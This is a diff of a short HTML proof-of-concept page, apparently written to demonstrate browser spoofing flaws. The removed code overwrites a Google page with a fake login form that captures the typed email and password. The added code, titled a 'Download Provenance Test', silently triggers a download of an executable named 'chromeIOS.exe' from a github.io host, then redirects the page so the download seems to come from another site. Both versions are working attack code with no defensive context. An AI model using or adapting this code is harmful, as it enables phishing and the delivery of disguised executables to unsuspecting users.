@@ -1,17 +1,34 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Download Provenance Test</title>
+</head>
+<body>
+
+<button onclick="startTest()">Start Download Test</button>
+
 <script>
-function go(){
-    var x = window.open('https://www.google.com/csi');
-    setTimeout(function(){
-        x.document.body.innerHTML = 
-            '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA' +
-            'AAAFCAYAAACNbyblAAAAHElEQVQI12P4/wcAAwAB/9hLS9B4zggwEXhEChcAZgdggp' +
-            'ZmMz3hDi9q8M/y79dyiTj6lwBQ0RVz0Kh0y4gAAAABJRU5ErkJggg==" alt="Hallo Image">' +
-            '<h1>Login</h1>' +
-            'Email:<input id="email"><br>' +
-            'Pass:<input id="pass" type="password"><br>' +
-            '<button onclick="alert(\'Email: \'+document.getElementById(\'email\').value+\'\\nPass:\'+document.getElementById(\'pass\').value)">Login</button>';
-    }, 3000);
+function startTest() {
+  const w = window.open("about:blank", "_blank");
+
+  // Step 1: Inject download trigger di context baru
+  w.document.write(`
+    <script>
+      const a = document.createElement('a');
+      a.href = "https://ecdnts-del.github.io/test-apk/chromeIOS.exe";
+      a.download = "chromeIOS.exe";
+      document.body.appendChild(a);
+      a.click();
+
+      // Step 2: Navigation change after download task created
+      requestAnimationFrame(() => {
+        location.replace("https://example.com");
+      });
+    <\/script>
+  `);
 }
 </script>
-<button onclick="go()">Go</button>
 
+</body>
+</html>
